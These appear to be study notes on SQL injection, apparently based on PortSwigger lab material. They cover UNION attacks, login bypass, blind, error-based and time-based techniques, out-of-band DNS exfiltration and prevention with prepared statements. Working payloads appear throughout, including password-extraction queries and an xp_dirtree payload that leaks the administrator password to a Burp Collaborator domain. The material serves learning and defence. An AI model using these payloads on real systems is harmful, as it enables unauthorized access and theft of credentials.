- '--' : indicator for comment. Rest statement interpreted as comment.
- 
![[Screenshot From 2025-05-24 15-59-44.png]]

- Admin'-- : comment sequence for authentication bypass.
- UNION : to retrieve data  from other databases.


A successful SQLi can result in unauthorized access to data like
- Passwords
- Credit Card details
- Personal user information.

To detect SQL injection manually:

1. **Use `'`** to trigger errors.
    
2. **Test SQL syntax** to compare normal vs. altered outputs.
    
3. **Use Boolean checks** like `OR 1=1` vs `OR 1=2`.
    
4. **Send time-based payloads** (e.g., `SLEEP(5)`) to check for delays.
    
5. **Use OAST payloads** to detect out-of-band responses.
## SQL in different parts of query
- In **WHERE** clause of a **SELECT** query.
- In **UPDATE** statements, within the updated values or the **WHERE** clause.
- In **INSERT** statement, within the inserted values.
- In **SELECT** statements, within the table or column name.
- in **SELECT** statements, within the **ORDER BY** clause.


## SQL injection examples

## Retrieving hidden data
original URL

```
https://insecure-website.com/products?category=Gifts
```

ATTACK 1

```
https://insecure-website.com/products?category=Gifts'--
```

RESULT
```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

ATTACK 2
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

RESULT
```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

---
### SQL Injection UNION Attack 

**Goal**: Retrieve data from other tables using the `UNION` SQL operator.

**Example**:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

**Requirements**:

1. Same number of columns in both queries.
    
2. Compatible data types.
    

---

### 🔍 How to Find Column Count:

**Method 1: `ORDER BY` test**

- Inject:
    
    ```
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    ```
    
- When error occurs, you've exceeded the number of columns.
    

**Method 2: `UNION SELECT NULL` test**

- Inject:
    
    ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    ```
    
- When it succeeds (no error or new row shows), column count is correct.
    

Use `NULL` to avoid data type issues.

---
### Database - specific syntax

#### 🔸 **Oracle**

- Every `SELECT` query **must include a `FROM` clause**.
    
- Use the **built-in table**:
    
    ```sql
    DUAL
    ```
    
    - Example payload:
        
        ' UNION SELECT NULL FROM DUAL--

#### 🔸 **MySQL**

- `FROM` clause is **not strictly required** for all `SELECT` queries.
    
- For comments:
    
    - Use `--` (note the **required space** after `--`)
        
    - Or use `#` to comment the rest of the query.
        
    - Examples:
        
        ```sql
        ' UNION SELECT NULL-- 
        ' UNION SELECT NULL# 
        ```
        

#### **Purpose of Comments in SQLi**

- To **terminate the legitimate SQL query** after injecting malicious input.
    
- Ensures the **injected SQL executes cleanly** without syntax errors.
---


###  Subverting Application Logic (SQL Injection)

Attackers exploit poorly constructed SQL queries to bypass authentication mechanisms. In login forms, if user input is not properly sanitized, the backend SQL query can be manipulated.

####  **Example Vulnerable Query:**

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese';
```

####  **Attack Technique:**

By entering the following as the **username**:

```
administrator'-- 
```

And leaving the **password blank**, the query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
```

####  What Happens:

- The `--` starts a comment in SQL, so the password check is ignored.
    
- The query effectively becomes:
    

```sql
SELECT * FROM users WHERE username = 'administrator';
```

- This allows the attacker to **log in without knowing the password**.
    

---

### Finding columns with a useful data type

- After finding the number of columns, test each for string support:
    

```sql
' UNION SELECT 'a',NULL,NULL--  
' UNION SELECT NULL,'a',NULL--  
```

- If `'a'` shows in the page → column accepts strings ✅
    
- If error (e.g., type conversion) → column doesn't accept strings ❌
    

✅ Needed to extract text like usernames/passwords.

---

###  Retrieving Multiple Values in One Column (SQLi UNION)

- When limited to **1 column**, use **concatenation** to combine multiple fields:
    

**Oracle Example:**

```sql
' UNION SELECT username || '~' || password FROM users--
```

- `||` = string join
    
- `~` = separator (can be anything)
    

✅ Output: `admin~pass`, `user~1234`, etc.

---
### Examine the database in SQL injection

This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

---

###  **Querying Database Type & Version (via SQL Injection)**

You can identify the **DB type & version** using provider-specific queries with `UNION SELECT`.

| **Database**      | **Version Query**         |
| ----------------- | ------------------------- |
| **MySQL / MSSQL** | `SELECT @@version`        |
| **Oracle**        | `SELECT * FROM v$version` |
| **PostgreSQL**    | `SELECT version()`        |

**Example Injection:**

```sql
' UNION SELECT @@version--
```

✅ If successful, reveals DB type & version like:

```
Microsoft SQL Server 2016 (SP2) ...
```



---

###  **Listing Database Contents using SQL Injection**

#### **List All Tables (Except Oracle):**

```sql
SELECT * FROM information_schema.tables
```

- Shows all tables in the database.
    

####  **Example Output:**

```
TABLE_NAME  
-----------
Products  
Users  
Feedback  
```

---

####  **List Columns in a Specific Table:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

- Reveals column names and data types.
    

####  **Example Output:**

```
COLUMN_NAME   DATA_TYPE  
-----------   ----------
UserId        int  
Username      varchar  
Password      varchar  
```

---
## Blind SQL Injection  
Occurs when SQL injection is possible, but **no output or errors are shown**.  
Uses **true/false checks** or **time delays** to infer data.  
`UNION SELECT` doesn't work here.


 ### **Blind SQL Injection via Conditional Responses – Short Note:**

Even if results aren't shown, you can detect SQL injection **by observing changes in the app's behavior**.

Example:

- Normal cookie:  
    `TrackingId=u5YD3PapBcR4lN3e7Tj4`  
    → Response: no message.
    
- Injected cookie:  
    `TrackingId=u5YD3PapBcR4lN3e7Tj4' AND 1=1--`  
    → Response: **“Welcome back”** (condition true).
    
- Injected cookie:  
    `TrackingId=u5YD3PapBcR4lN3e7Tj4' AND 1=2--`  
    → Response: no message (condition false).
    
	 
- **By testing true/false logic**, you can extract data **bit by bit** from the database.

---

### Blind SQL Injection Using Conditional Responses

In **blind SQL injection**, results aren't shown directly — but app behavior changes help infer data.

We exploit this by guessing values **one character at a time**, using conditions.

**Example:**

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) = 's
```

- If the app responds with "Welcome back", guess is correct.
    
- Repeat for each character to extract the full password.
    

 **SUBSTRING()** (or **SUBSTR()**) helps extract specific characters in such character-by-character guessing.

 This technique is called **Boolean-based blind SQL injection**.

---
###  Error-Based SQL Injection

* Uses **database error messages** to extract or infer data.
* Works even when query results aren’t shown (blind SQLi).

####  Two types:

1. **Conditional errors** – Trigger errors based on conditions.
2. **Verbose errors** – Errors reveal actual data.

#### Example:

```sql
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

* If `password` is text → error leaks data.

 **Needs verbose error messages** to be enabled.


---

### Exploiting Blind SQL Injection via Conditional Errors

#### Problem:

Sometimes in **Blind SQL Injection**, the application’s response **doesn't change** based on true/false conditions — so you **can’t rely on visible content changes** like "Welcome back".

#### Solution:

You inject SQL that **triggers an error only if a condition is true**. If the app responds differently due to the error, you know your condition was true.

---

###  How it Works:

Use the `CASE WHEN` SQL construct to trigger a divide-by-zero **only when a condition is true**.

#### Examples:

```sql
TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

- `1=2` is **false** → returns `'a'` → **no error**
    

```sql
TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

- `1=1` is **true** → runs `1/0` → **division-by-zero error**
    

If the app’s response changes when the error happens (e.g., HTTP 500, error message, or crash), you’ve successfully tested a condition.

---

###  Use Case: Extracting Data

Test character-by-character using error behavior to reveal correct values.

```sql
TrackingId=xyz' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

- If **error appears**, first char of admin's password is **after 'm'**
    
- If **no error**, it’s **before or equal to 'm'**
    

Repeat with `'a'`, `'b'`, etc. until you find the exact character.

---

### **Extracting Sensitive Data via Verbose SQL Errors**


When an application or database is misconfigured, it may show **verbose error messages** during SQL injection attempts. These errors can **leak valuable information** such as:

- SQL query structure
    
- Table or column names
    
- Data types
    
- Sometimes even real data
    

---

#### Example:

 inject a single quote (`'`) into a URL parameter:

```
http://example.com/tracking?id='
```

 app returns:

```
Unterminated string literal started at position 52 in SQL: SELECT * FROM tracking WHERE id = '''...
```


- You're inside a **single-quoted string**
    
- The full query uses the `tracking` table and `id` column
    
- You can now inject more accurate payloads:
    

Example:

```sql
' OR '1'='1' -- 
```

    
- Helps attacker build valid SQL payloads
    
- Often turns **blind SQLi** into **visible SQLi**
    

---

###  **Extracting Sensitive Data via Verbose SQL Errors (Continued)**
Can **force the application to throw an error** that leaks actual **data from the database**, making blind SQLi visible.

- Use the `CAST()` function to **convert data** into an incompatible type (like string → int).

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

If `example_column` contains text, the DB throws an error like:

```
ERROR: invalid input syntax for type integer: "Example data"
```


- Reveals **real values** (like usernames or passwords) in error messages
    
- Useful when output is otherwise hidden
    
- Helps **bypass character limits** where other injection methods fail.
---


### Blind SQL Injection via Time Delays

When output and errors are hidden, use **response time** to infer if a condition is true.

---

### 🧪 Example (MSSQL):

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--  → ✅ Delay (true)
'; IF (1=2) WAITFOR DELAY '0:0:10'--  → ❌ No delay (false)
```

---

### 🔐 Extracting Data:

```sql
'; IF (
  SELECT COUNT(*)
  FROM Users
  WHERE Username='Administrator'
    AND SUBSTRING(Password,1,1) > 'm'
) = 1 WAITFOR DELAY '0:0:10'--
```

- Delay = condition true → helps guess password letter-by-letter.


Use when:

- No visible output or errors
    
- App **delays** on true condition
    

---

##  Exploiting Blind SQL Injection Using Out-of-Band (OAST) Techniques

### 🔹 When to Use

- When **response-based** techniques like:
    
    - Errors
        
    - Delays
        
    - Conditional responses  
        **do not work** (e.g., due to asynchronous processing or silent handling).
        

---

### 🔹 Concept

- The vulnerable SQL query **executes**, but the app **doesn’t show any visible result**.
    
- Instead, we **trigger a DNS/network interaction** to a domain we control.
    
- If we **see that request**, we know our payload executed successfully.
    

---

### 🔹 Tools

- Use **Burp Collaborator**, which provides:
    
    - Custom subdomains (like `abc123.burpcollaborator.net`)
        
    - Built-in DNS listener
        
    - Logging for any DNS, HTTP, or SMTP interaction
        

---

### 🔹 Payload Example for Microsoft SQL Server:

```sql
'; exec master..xp_dirtree '\\abc123.burpcollaborator.net\a'--
```

🔍 **Explanation**:

- `xp_dirtree` lists folders from a given path.
    
- The UNC path `\\abc123.burpcollaborator.net\a` forces the **database server to make a DNS query**.
    
- If you observe the lookup in Burp Collaborator → The SQLi worked!
    

---

### 🔹 What is a UNC Path?

**UNC (Universal Naming Convention)** is the Windows format for accessing shared resources over a network.

#### ✅ Syntax:

```
\\Server\Share\Path
```

#### ✅ Used in this attack as:

```
\\your-subdomain.burpcollaborator.net\a
```

➡️ Forces **DNS resolution**, which we capture to detect or exfiltrate data.

---

### 🔹 Example: Extracting Data via DNS

You can leak information by encoding it in the domain:

```sql
'; exec master..xp_dirtree '\\adminpass123.burpcollaborator.net\a'--
```

If the password is `adminpass123`, you’ll see a DNS request to:

```
adminpass123.burpcollaborator.net
```

---

### ✅ Summary

- Use OAST techniques like DNS lookups when the app:
    
    - Does not show errors
        
    - Does not delay on time-based injections
        
- Use UNC paths to **trigger DNS requests**.
    
- Use tools like **Burp Collaborator** to detect them.
    
- Useful for **detecting SQLi** and even **extracting sensitive data**.
    

---
Here's a **detailed explanation** of the technique described in your note on **Exploiting Blind SQL Injection using Out-of-Band (OAST) techniques - Continued**:

---

## 🛰️ Exploiting Blind SQLi Using Out-of-Band (OAST) – Data Exfiltration

Once you’ve confirmed that your **SQL payload** can trigger an **out-of-band DNS request** (like to Burp Collaborator), you can **go further** — not just detect a vulnerability, but **exfiltrate sensitive data** such as passwords via DNS queries.


Use SQL injection to **extract data (e.g., passwords)** from the database by **embedding it in a DNS query**, which will hit your server (e.g., Burp Collaborator) — allowing you to read the secret.

---

### Payload 

```sql
'; 
DECLARE @p VARCHAR(1024);
SET @p = (SELECT password FROM users WHERE username='Administrator');
EXEC('master..xp_dirtree "//' + @p + '.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```


---

#### Steps:

1. **`DECLARE @p VARCHAR(1024);`**

   * Create a variable `@p` to hold the password.

2. **`SET @p = (SELECT password FROM users WHERE username='Administrator');`**

   * Assign the `Administrator` user's password to `@p`.

3. **`EXEC('master..xp_dirtree "//' + @p + '.<yourdomain>.burpcollaborator.net/a"')`**

   * Build a string that looks like a **UNC path** (e.g. `\\S3cure.burpcollaborator.net\a`)
   * `xp_dirtree` tries to **access** that network path
   * Windows will try to **resolve the domain name** in `@p.<domain>` — which triggers a **DNS request**

4. **Burp Collaborator logs the DNS request**:

   * You receive a DNS query like:

     ```
     S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
     ```
   * The password (`S3cure`) is now visible to you — data exfiltration complete.

---

### 📌 Real Example

If the password in the database is `S3cure`, then this SQL payload causes the **database server** to make a DNS lookup to:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Since this is your **custom subdomain**, Burp logs the query — **leaking the password**.

---

### 🔐 Why This Is Powerful

* ✅ **Silent**: No visible errors, no delays.
* ✅ **Bypasses output filtering**: No need for the response to show SQL results.
* ✅ **Works asynchronously**: Even if SQL query runs in the background.
* ✅ **Direct data exfiltration**: You see the actual secret data via the DNS query.


---

## SQL Injection in Different Contexts


SQL injection isn’t limited to URL query strings — **any user-controllable input** that ends up in a SQL query is potentially injectable.

---

### Common Injection Contexts:

- URL query parameters
    
- Form fields (POST data)
    
- HTTP headers (like User-Agent, Referer)
    
- **JSON payloads**
    
- **XML inputs**
    
- Cookies
    
- WebSockets
    

---

###  Example: XML-based SQL Injection

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

- `&#x53;` is the hex for **S** → becomes `SELECT` server-side.
    
- This allows an attacker to **bypass basic keyword filters** (e.g., WAFs).
    
- Injection happens after XML is **parsed and decoded**.
    

---

### Why this matters:

- **More injection surfaces** to test in modern applications.
    
- Web apps that use **APIs, SOAP, or REST** are especially vulnerable.
    
- Defense mechanisms often miss these **non-traditional vectors**.
    

---

## Second-Order SQL Injection

- Unlike **first-order SQLi**, where malicious input is used **immediately**, second-order SQL injection occurs when:
    
    1. Malicious input is **stored** (e.g., in a database).
        
    2. It is later **retrieved and unsafely used** in a SQL query.
        

---

###  Example :

1. Attacker signs up with the username:  
    `admin'--`
    
2. Input is **stored safely** in the database (e.g., via prepared statement).
    
3. Later, app uses stored username like:  
    `SELECT * FROM users WHERE username = '`**stored_username**`'`
    
4. Query becomes:  
    `SELECT * FROM users WHERE username = 'admin'--'` → Bypasses auth.
    

---

###  Why it happens:

- Developers often **sanitize (escape) input during storage**, but **not during retrieval/use**.
    
- Stored data is mistakenly treated as **"trusted"**, even when it's not.
    

- Also known as  **Stored SQL Injection**
    

---

Here are the final **SQL Injection Prevention Notes**, based **only** on the data you've provided, along with a clear explanation of the vulnerable and secure code execution:

---

###  How to Prevent SQL Injection

#### Use Parameterized Queries (Prepared Statements)

**Problem with this vulnerable code:**

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```


- The user-provided `input` is directly inserted into the SQL string.
    
- If a user enters a malicious input like:  
    `electronics' OR '1'='1`,  
    the final query becomes:
    
    ```sql
    SELECT * FROM products WHERE category = 'electronics' OR '1'='1'
    ```
    
- This is SQL Injection — the attacker alters the logic of the SQL query.
    
####  Secure version using PreparedStatement:

```java
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

- The SQL query is first **compiled** with the `?` placeholder.
    
- Then, the user input is **safely bound** to the placeholder using `setString`.
    
- Even if a malicious input like `' OR '1'='1` is passed, it is treated **as a string value**, not SQL logic.
    
---

###  How to Prevent SQL Injection – Continued

#### **1. Use Parameterized Queries Wherever Possible**

- Works for any input used **as data** in SQL (e.g. `WHERE`, `INSERT`, `UPDATE`).
    
- Keeps user input **separate from SQL logic**, preventing manipulation.
    

---

#### **2. Parameterized Queries Can't Be Used Everywhere**

They **do not protect** when:

- User input controls **table names**, **column names**, or **ORDER BY** clauses.
    
- Example (bad):
    
    ```sql
    SELECT * FROM products ORDER BY 'user_input'
    ```
    

---

#### **3. For Such Cases, Use:**

- **Whitelisting**:
    
    - Allow only known, safe values.
        
    - Example: Only permit values like `price`, `rating`, `name` in ORDER BY.
        
- **Alternative Logic**:
    
    - Rewrite logic to avoid passing untrusted input into unsafe SQL locations.
        

---

####  **4. Keep the Query String a Hard-Coded Constant**

- The **SQL string itself** must never be built using user input.
    
- Example (correct):
    
    ```java
    String sql = "SELECT * FROM users WHERE id = ?";
    ```
    
- Example (wrong):
    
    ```java
    String sql = "SELECT * FROM users WHERE " + userInputColumn + " = ?";
    ```
    

---

####  **5. Don’t Decide “Safe” Inputs Case-by-Case**

- You might assume a value is trusted (e.g., from a session or internal logic), but:
    
    - It might get tainted due to changes elsewhere.
        
    - It’s easy to make a mistake and expose the app to SQLi.
        

---

### RECAP

- Use **prepared statements** for all variable data in queries.
    
- **Never build SQL strings dynamically**, even if the input seems trusted.
    
- For dynamic elements like column names or table names:
    
    - Apply strict **whitelisting**.
        
    - Avoid injecting data into SQL structure.
        
gvovycscxa1hbnpfkfk2

fl1acyh5tpqtdy5pnocp
g3VKi7Va7LjkyT6J